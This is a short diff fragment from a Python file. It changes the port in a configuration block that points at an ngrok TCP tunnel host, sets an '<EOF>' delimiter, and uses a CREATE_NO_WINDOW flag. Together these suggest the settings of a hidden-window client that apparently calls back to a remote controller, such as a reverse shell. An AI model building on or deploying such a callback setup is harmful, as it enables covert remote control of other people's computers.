@@ -21,7 +21,7 @@ import ctypes
 # CONFIG
 # ──────────────────────────────────────────────
 SERVER_IP   = "0.tcp.in.ngrok.io"
-SERVER_PORT = 19681
+SERVER_PORT = 12464
 DELIMITER   = "<EOF>"
 
 _NO_WINDOW = 0x08000000  # CREATE_NO_WINDOW
